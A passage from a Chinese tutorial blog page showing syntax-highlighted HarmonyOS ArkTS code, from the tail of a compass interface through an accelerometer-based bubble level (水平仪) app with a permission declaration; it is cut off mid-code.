class="comment">// 设置边框宽度</span></span><br><span class="line">            .<span class="title function_">stroke</span>(<span class="string">&#x27;#f95941&#x27;</span>) <span class="comment">// 设置边框颜色</span></span><br><span class="line">            .<span class="title function_">strokeDashArray</span>([<span class="number">1</span>, <span class="number">5</span>]) <span class="comment">// 设置边框虚线样式</span></span><br><span class="line">            .<span class="title function_">strokeLineJoin</span>(<span class="title class_">LineJoinStyle</span>.<span class="property">Round</span>); <span class="comment">// 设置边框连接方式</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;北&#x27;</span>) <span class="comment">// 创建一个文本，显示“北”</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// 设置对齐方式</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#ff4f3f&#x27;</span>) <span class="comment">// 设置文本颜色</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">0</span> &#125;) <span class="comment">// 设置旋转角度</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// 设置内边距</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// 设置文本对齐方式</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;东&#x27;</span>) <span class="comment">// 创建一个文本，显示“东”</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// 设置对齐方式</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#fcfdfd&#x27;</span>) <span class="comment">// 设置文本颜色</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">90</span> &#125;) <span class="comment">// 设置旋转角度</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// 设置内边距</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// 设置文本对齐方式</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;南&#x27;</span>) <span class="comment">// 创建一个文本，显示“南”</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// 设置对齐方式</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#fcfdfd&#x27;</span>) <span class="comment">// 设置文本颜色</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">180</span> &#125;) <span class="comment">// 设置旋转角度</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// 设置内边距</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// 设置文本对齐方式</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;西&#x27;</span>) <span class="comment">// 创建一个文本，显示“西”</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// 设置对齐方式</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#fcfdfd&#x27;</span>) <span class="comment">// 设置文本颜色</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">270</span> &#125;) <span class="comment">// 设置旋转角度</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// 设置内边距</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// 设置文本对齐方式</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">50</span> &#125;) <span class="comment">// 设置上边距</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: -<span class="variable language_">this</span>.<span class="property">rotationAngle</span> &#125;) <span class="comment">// 设置旋转角度</span></span><br><span class="line">        .<span class="title function_">animation</span>(&#123;&#125;); <span class="comment">// 设置动画效果</span></span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Line</span>() <span class="comment">// 创建一个线条</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">5</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">40</span>) <span class="comment">// 设置高度</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#fdfffe&#x27;</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="number">200</span> &#125;); <span class="comment">// 设置下边距</span></span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">      .<span class="title function_">height</span>(<span class="number">300</span>); <span class="comment">// 设置高度</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#18181a&#x27;</span>); <span class="comment">// 设置背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="level"><a href="#level" class="headerlink" title="level"></a>level</h1><p>水平仪</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//module.json5</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;module&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;requestPermissions&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;ohos.permission.ACCELEROMETER&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 导入传感器服务模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; sensor &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.SensorServiceKit&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入业务错误处理模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BusinessError</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义单位长度，用于后续计算中的比例尺</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UNIT_LENGTH</span> = <span class="number">4</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用 @Entry 和 @Component 装饰器定义一个名为 LevelMeter 的组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">LevelMeter</span> &#123;</span><br><span class="line">  <span class="comment">// 定义状态变量，用于存储当前角度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">angle</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 定义状态变量，用于存储前后倾斜角度（pitch）</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">pitch</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 定义状态变量，用于存储左右倾斜角度（roll）</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">roll</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 定义角度变化阈值，用于判断是否需要更新角度</span></span><br><span class="line">  private <span class="attr">threshold</span>: number = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 组件即将出现时的生命周期方法</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// 获取传感器列表</span></span><br><span class="line">    sensor.<span class="title function_">getSensorList</span>(<span class="function">(<span class="params">error: BusinessError</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="comment">// 如果获取传感器列表失败，输出错误信息</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;获取传感器列表失败&#x27;</span>, error);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 开始更新方向信息</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">startOrientationUpdates</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 启动方向更新的方法</span></span><br><span class="line">  private <span class="title function_">startOrientationUpdates</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// 注册加速度传感器事件监听器</span></span><br><span class="line">    sensor.<span class="title function_">on</span>(sensor.<span class="property">SensorId</span>.<span class="property">ACCELEROMETER</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 计算新的前后倾斜角度（pitch）</span></span><br><span class="line">      <span class="keyword">const</span> newPitch = <span class="title class_">Math</span>.<span class="title function_">atan</span>(data.<span class="property">y</span> / <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(data.<span class="property">x</span> * data.<span class="property">x</span> + data.<span class="property">z</span> * data.<span class="property">z</span>)) * (<span class="number">180</span> / <span class="title class_">Math</span>.<span class="property">PI</span>);</span><br><span class="line">      <span class="comment">// 计算新的左右倾斜角度（roll）</span></span><br><span class="line">      <span class="keyword">const</span> newRoll = <span class="title class_">Math</span>.<span class="title function_">atan</span>(data.<span class="property">x</span> / <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(data.<span class="property">y</span> * data.<span class="property">y</span> + data.<span class="property">z</span> * data.<span class="property">z</span>)) * (<span class="number">180</span> / <span class="title class_">Math</span>.<span class="property">PI</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 如果新的角度变化超过阈值，则更新状态</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(newPitch - <span class="variable language_">this</span>.<span class="property">pitch</span>) &gt; <span class="variable language_">this</span>.<span class="property">threshold</span> || <span class="title class_">Math</span>.<span class="title function_">abs</span>(newRoll - <span class="variable language_">this</span>.<span class="property">roll</span>) &gt; <span class="variable language_">this</span>.<span class="property">threshold</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">pitch</span> = newPitch;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">roll</span> = newRoll;</span><br><span class="line">        <span class="comment">// 更新当前角度</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">angle</span> = <span class="title class_">Math</span>.<span class="title function_">hypot</span>(newPitch, newRoll);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123; <span class="attr">interval</span>: <span class="number">100000000</span> &#125;); <span class="comment">// 设置更新间隔为100毫秒</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 计算小球位置的方法</span></span><br><span class="line">  private <span class="title function_">calculateBallPosition</span>(): <span class="title class_">Position</span> &#123;</span><br><span class="line">    <span class="comment">// 根据当前角度计算半径</span></span><br><span class="line">    <span class="keyword">const</span> radius = (<span class="variable language_">this</span>.<span class="property">angle</span> &lt;= <span class="number">10</span> ? <span class="variable language_">this</span>.<span class="property">angle</span> * <span class="number">2.5</span> : (<span class="number">10</span> * <span class="number">2.5</span> + (<span class="variable language_">this</span>.<span class="property">angle</span> - <span class="number">10</span>))) * <span class="variable constant_">UNIT_LENGTH</span>;</span><br><span class="line">    <span class="comment">// 将角度转换为弧度</span></span><br><span class="line">    <span class="keyword">const</span> angleInRadians = <span class="title class_">Math</span>.<span class="title function_">atan2</span>(<span class="variable language_">this</span>.<span class="property">pitch</span>, <span class="variable language_">this</span>.<span class="property">roll</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 计算小球在圆周上的X坐标</span></span><br><span class="line">    <span class="keyword">const</span> x = -radius * <span class="title class_">Math</span>.<span class="title function_">cos</span>(angleInRadians);</span><br><span class="line">    <span class="comment">// 计算小球在圆周上的Y坐标</span></span><br><span class="line">    <span class="keyword">const</span> y = radius * <span class="title class_">Math</span>.<span class="title function_">sin</span>(angleInRadians);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 返回小球的位置</span></span><br><span class="line">    <span class="keyword">return</span> &#123; x, y &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建UI的方法</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 使用Stack布局容器</span></span><br><span class="line">    <span class="title class_">Stack</span>() &#123;</span><br><span class="line">      <span class="comment">// 显示当前角度的文本</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// 创建一个行布局，设置间距为5</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="variable language_">this</span>.angle)&#125;</span>°`</span>)<span class="comment">// 显示当前角度</span></span><br><span class="line">            .<span class="title function_">layoutWeight</span>(<span class="number">1</span>)<span class="comment">// 设置布局权重</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 文本对齐方式</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#dedede&#x27;</span>)<span class="comment">// 文本颜色</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">60</span>); <span class="comment">// 文本大小</span></span><br><span class="line">        &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// 设置宽度和上边距</span></span><br><span class="line">      &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// 设置高度和对齐方式</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 模拟水平仪背景的圆环</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="comment">// 外部大圆</span></span><br><span class="line">        <span class="title class_">Text</span>()</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;600lpx&#x27;</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;600lpx&#x27;</span>)<span class="comment">// 设置高度</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#171b1e&quot;</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">blur</span>(<span class="number">50</span>)<span class="comment">// 设置模糊效果</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="attr">radius</span>: <span class="number">300</span>, <span class="attr">type</span>: <span class="title class_">ShadowType</span>.<span class="property">COLOR</span>, <span class="attr">color</span>: <span class="string">&quot;#232426&quot;</span> &#125;); <span class="comment">// 设置阴影效果</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 中间圆</span></span><br><span class="line">        <span class="title class_">Text</span>()</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.angle &lt;= <span class="number">10</span> ? <span class="variable language_">this</span>.angle * <span class="number">2.5</span> : (<span class="number">10</span> * <span class="number">2.5</span> + (<span class="variable language_">this</span>.angle - <span class="number">10</span>))) * UNIT_LENGTH *</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 计算宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.angle &lt;= <span class="number">10</span> ? <span class="variable language_">this</span>.angle * <span class="number">2.5</span> : (<span class="number">10</span> * <span class="number">2.5</span> + (<span class="variable language_">this</span>.angle - <span class="number">10</span>))) * UNIT_LENGTH *</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 计算高度</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#2e3235&quot;</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">animation</span>(&#123; <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseOut</span> &#125;); <span class="comment">// 设置动画效果</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 刻度线</span></span><br><span class="line">        <span class="title class_">ForEach</span>([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>], <span class="function">(<span class="params">item: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Text</span>()</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="number">15</span> + item) * UNIT_LENGTH * <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 计算宽度</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;(<span class="number">15</span> + item) * UNIT_LENGTH * <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 计算高度</span></span><br><span class="line">            .<span class="title function_">borderWidth</span>(<span class="number">1</span>)<span class="comment">// 设置边框宽度</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// 设置圆角</span></span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="string">&quot;#807d8184&quot;</span>); <span class="comment">// 设置边框颜色</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 刻度数字</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">20</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&quot;#7d8184&quot;</span>)<span class="comment">// 设置字体颜色</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">10</span>)<span class="comment">// 设置字体大小</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 设置文本对齐方式</span></span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;(<span class="number">15</span> + item) * UNIT_LENGTH * <span class="number">2</span>&#125;</span>lpx`</span> &#125;); <span class="comment">// 设置左边距</span></span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 小球</span></span><br><span class="line">        <span class="title class_">Text</span>()</span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">14</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">14</span>)<span class="comment">// 设置高度</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#ff5841&quot;</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>); <span class="comment">// 设置圆角</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 小球背景</span></span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">radialGradient</span>(&#123;</span><br><span class="line">            <span class="attr">center</span>: [<span class="number">20</span>, <span class="number">20</span>], <span class="comment">// 设置渐变中心点</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">60</span>, <span class="comment">// 设置渐变半径</span></span><br><span class="line">            <span class="attr">colors</span>: [</span><br><span class="line">              [<span class="string">&quot;#807a7a83&quot;</span>, <span class="number">0.0</span>], <span class="comment">// 渐变颜色1</span></span><br><span class="line">              [<span class="string">&quot;#8074747e&quot;</span>, <span class="number">0.7</span>], <span class="comment">// 渐变颜色2</span></span><br><span class="line">              [<span class="string">&quot;#80898992&quot;</span>, <span class="number">1.0</span>]<span class="comment">// 渐变颜色3</span></span><br><span class="line">            ]</span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度和高度</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">clip</span>(<span class="literal">true</span>) <span class="comment">// 设置裁剪</span></span><br><span class="line">        .<span class="title function_">radialGradient</span>(&#123;</span><br><span class="line">          <span class="attr">center</span>: [<span class="number">20</span>, <span class="number">20</span>], <span class="comment">// 设置渐变中心点</span></span><br><span class="line">          <span class="attr">radius</span>: <span class="number">60</span>, <span class="comment">// 设置渐变半径</span></span><br><span class="line">          <span class="attr">colors</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="variable language_">this</span>.<span class="property">angle</span>) === <span class="number">0</span> ?</span><br><span class="line">            [[<span class="string">&quot;#FF6B6B&quot;</span>, <span class="number">0.0</span>], [<span class="string">&quot;#D84315&quot;</span>, <span class="number">0.3</span>], [<span class="string">&quot;#C62828&quot;</span>, <span class="number">1.0</span>]] : <span class="comment">// 当角度为0时的渐变颜色</span></span><br><span class="line">            [[<span class="string">&quot;#bcbcc6&quot;</span>, <span class="number">0.0</span>], [<span class="string">&quot;#464650&quot;</span>, <span class="number">0.3</span>], [<span class="string">&quot;#474750&quot;</span>, <span class="number">1.0</span>]] <span class="comment">// 当角度不为0时的渐变颜色</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">width</span>(<span class="number">50</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">        .<span class="title function_">translate</span>(&#123;</span><br><span class="line">          <span class="attr">x</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.calculateBallPosition().x&#125;</span>lpx`</span>, <span class="comment">// 设置X轴偏移</span></span><br><span class="line">          <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.calculateBallPosition().y&#125;</span>lpx`</span> <span class="comment">// 设置Y轴偏移</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">animation</span>(&#123; <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseOut</span> &#125;); <span class="comment">// 设置动画效果</span></span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;580lpx&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;580lpx&#x27;</span>).<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置外部大圆的宽度、高度和圆角</span></span><br><span class="line">    &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置Stack的高度</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置Stack的宽度</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span 